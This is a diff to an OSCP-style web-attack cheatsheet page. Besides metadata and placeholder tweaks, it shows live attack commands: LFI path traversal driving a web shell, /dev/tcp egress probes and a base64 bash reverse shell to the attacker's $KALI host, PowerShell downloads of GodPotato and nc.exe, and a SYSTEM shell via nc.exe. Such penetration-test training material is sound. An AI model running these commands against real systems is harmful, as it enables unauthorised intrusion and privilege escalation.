@@ -4,6 +4,7 @@ date: 2026-06-20
 weight: 30
 draft: false
 summary: "A checklist covering directory brute forcing, CMS, LFI, file upload, SSTI, and XXE."
+description: "A checklist covering directory brute forcing, CMS, LFI, file upload, SSTI, XXE, and DNN."
 ---
 
 A checklist to run the moment you find a web port. Covers directory brute forcing, CMS, LFI, file upload, SSTI, XXE, and DNN.
@@ -11,6 +12,7 @@ A checklist to run the moment you find a web port. Covers directory brute forcin
 - Source: https://heretek.dev/oscp-cheatsheet/web-attacks/ (Jean Romero) — Reconstructed
 - Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP
 - Variables: `$ip` = target web server IP (used interchangeably), `ATTACKER`/`CALLBACK` in the text are placeholders
+- These aliases are literal placeholders — replace them with real addresses before running.
 
 ## Reconnaissance and Directory Discovery
 
@@ -73,16 +75,16 @@ View source on every page: look for HTML comments (credentials/paths), hidden fo
 If GET errors or returns an empty response, try POST:
 
 ```bash
-curl http://$ip:PORT/endpoint
-curl -d "" -X POST http://$ip:PORT/endpoint
-curl -d "" -X POST -H "Content-Type: application/x-www-form-urlencoded" http://$ip:PORT/endpoint
+curl http://$ip:$PORT/endpoint
+curl -d "" -X POST http://$ip:$PORT/endpoint
+curl -d "" -X POST -H "Content-Type: application/x-www-form-urlencoded" http://$ip:$PORT/endpoint
 
 # GET requests
-curl http://$TARGET:<port>/
+curl http://$TARGET:$PORT/
 curl http://$TARGET:33333/<endpoint>
 
 # POST requests
-curl -s -i -X POST -H 'Content-Length: 0' http://$TARGET:<port>/<endpoint>
+curl -s -i -X POST -H 'Content-Length: 0' http://$TARGET:$PORT/<endpoint>
 ```
 
 Lesson: a high-port API (e.g. 33333) returned nothing on GET. A POST with a Content-Length header exposed a process list, which contained hardcoded credentials. If GET looks empty, always try POST.
@@ -115,6 +117,7 @@ sudo tcpdump -ni tun0 "tcp and host $TARGET and (port 443 or port 80 or port 53)
 # 2. Fire timeout probes to common egress ports (whichever shows a SYN in tcpdump is open)
 curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/443"'
 curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/80"'
+curl -sG 'http://$TARGET/index.php?file=....//....//....//<path>/simpleshell.php' --data-urlencode 'cmd=timeout 3 bash -c "echo x > /dev/tcp/$KALI/53"'
 
 # 3. Base64-encode the reverse shell and fire it on the working port
 echo -n 'bash -i >& /dev/tcp/$KALI/443 0>&1' | base64
@@ -254,7 +257,7 @@ C:/xampp/htdocs/wp-config.php
 
 ### Web Root Locations
 
-- Apache (XAMPP) / Windows → `C:\xampp\htdocs\`
+- Apache (XAMPP) / Windows → `C:/xampp/htdocs/`
 - Apache / Linux → `/var/www/html/`
 - IIS / Windows → `C:\inetpub\wwwroot\`
 - nginx / Linux → `/var/www/html/`
@@ -470,8 +473,8 @@ The IIS AppPool identity holds SeImpersonatePrivilege. Go to SYSTEM with GodPota
 ```bash
 whoami /priv
 # Download tools
-powershell -c "iwr http://KALI/GodPotato-NET4.exe -o C:\Windows\Temp\gp.exe"
-powershell -c "iwr http://KALI/nc.exe -o C:\Windows\Temp\nc.exe"
+powershell -c "iwr http://$KALI/GodPotato-NET4.exe -o C:\Windows\Temp\gp.exe"
+powershell -c "iwr http://$KALI/nc.exe -o C:\Windows\Temp\nc.exe"
 # Listener on Kali
 C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe KALI 4444 -e cmd.exe"
 ```
